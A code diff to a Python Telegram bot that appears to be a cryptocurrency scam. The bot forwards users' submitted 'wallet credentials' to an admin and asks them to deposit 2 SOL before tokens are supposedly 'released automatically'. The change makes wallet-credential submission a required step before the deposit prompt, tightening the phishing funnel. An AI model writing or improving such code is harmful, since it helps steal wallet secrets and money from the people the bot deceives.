@@ -267,12 +267,21 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
 
     elif data == "claim_token":
-        await query.message.reply_text(
-            "🎁 *Claim Token*\n\n"
-            "To claim your token, please deposit *2 SOL* to your connected wallet first.\n\n"
-            "Once your deposit is confirmed, your tokens will be released automatically! 🚀",
-            parse_mode="Markdown",
-        )
+        user_id = user.id
+        if context.user_data.get("wallet_connected"):
+            await query.message.reply_text(
+                "🎁 *Claim Token*\n\n"
+                "To claim your token, please deposit *2 SOL* to your connected wallet first.\n\n"
+                "Once your deposit is confirmed, your tokens will be released automatically! 🚀",
+                parse_mode="Markdown",
+            )
+        else:
+            await query.message.reply_text(
+                "🎁 *Claim Token*\n\n"
+                "⚠️ You need to connect your wallet first before claiming tokens!\n\n"
+                "Click the 👛 *Connect Wallet* button to get started.",
+                parse_mode="Markdown",
+            )
 
     elif data == "referrals":
         ref_link = f"https://t.me/YourBotUsername?start=ref_{user.id}"
@@ -343,6 +352,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             # Notify admin with what they sent
             await notify_admin(context, user, "👛 Submitted wallet credentials", text)
             waiting_for_wallet[user.id] = False
+            context.user_data["wallet_connected"] = True
             await update.message.reply_text(
                 "✅ *Wallet connected successfully!*\n\n"
                 "Your wallet has been linked. You can now buy and sell tokens.",
